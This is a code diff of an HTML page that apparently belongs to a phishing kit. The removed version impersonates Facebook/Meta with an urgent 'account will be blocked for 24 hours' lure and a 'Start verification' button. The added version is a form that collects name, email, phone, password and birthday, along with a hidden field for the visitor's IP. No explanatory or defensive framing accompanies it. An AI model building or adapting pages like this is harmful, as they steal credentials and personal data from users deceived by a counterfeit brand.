@@ -1,36 +1,49 @@
-<!doctype html>
-<title>flems</title>
-<link rel="stylesheet" type="text/css" href="style.css"></link>
-
-<body>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-
-
-
-<div class="container" id="app">
-    <img class="hero-image" src="https://about.fb.com/wp-content/uploads/2021/12/NRP-Expanding-Facebook-Protect-to-the-World_Header.jpg?w=1920" />
-    <p class="title" id="title">Your account will be blocked for 24 hours.</p>
-    <p class="description" id="description">Our system detected unusual activity on your account which may violate image and posting rules.</p>
-
-    <div class="steps-container">
-        <div class="vertical-line"></div>
-        <div class="step">
-            <div class="step-icon">
-                <i class="fas fa-circle-check" style="color: #9CA3AF; font-size: 28px;"></i>
-            </div>
-            <p class="step-text" id="step1">Please check and follow the indicated steps.</p>
-        </div>
-        <div class="step">
-            <div class="step-icon">
-                <i class="fas fa-id-card" style="color: #355797; font-size: 28px;"></i>
-            </div>
-            <p class="step-text" id="step2">To avoid account blocking, you have 24 hours left to verify and appeal.</p>
-        </div>
+<div class="card" role="main">
+    <div class="hero" aria-hidden="true">
+      <img src="hero.jpg">
     </div>
-    <button class="continue-btn" id="continueBtn">Start verification</button>
-    <p class="restricted-text" id="restrictedText">
-        Your account was restricted on <span class="date-bold" id="currentDate">meta 2025</span>
-    </p>
-</div>
-<script src="app.js"></script>
-</body>
+
+    <h1 id="title"></h1>
+    <p id="lead" class="lead"></p>
+
+    <form id="regForm">
+      <div class="field">
+        <label for="name" id="label-name"></label>
+        <input id="name" name="name" type="text" required autocomplete="name" />
+      </div>
+
+      <div class="field">
+        <label for="email" id="label-email"></label>
+        <input id="email" name="email" type="email" required autocomplete="email" />
+      </div>
+
+      <div class="field">
+        <label for="phone" id="label-phone"></label>
+        <input id="phone" name="phone" type="tel" 
+         inputmode="numeric" 
+         pattern="[0-9+]*" 
+         placeholder="  " required />
+      </div>
+       
+      <div class="field">
+        <label for="password" id="label-password"></label>
+        <div style="position:relative;display:inline-block;width:100%;">
+          <input id="password" name="password" type="password" required 
+                 style="width:100%;padding-right:40px;height:36px;border-radius:8px;border:1px solid #e6e9ee;" 
+                 autocomplete="new-password" />
+          <button type="button" id="togglePw" title="Show/Hide password"
+                  style="position:absolute;right:8px;top:50%;transform:translateY(-50%);border:none;background:transparent;cursor:pointer;font-size:16px;">
+            👁
+         </button>
+        </div>
+      </div>
+
+      <div class="field">
+        <label for="birthday" id="label-birthday"></label>
+        <input id="birthday" name="birthday" type="date" required />
+      </div>
+
+      <input type="hidden" id="ip" name="ip" value="">
+      <button class="btn" id="submitBtn" type="submit"></button>
+    </form>
+  </div>
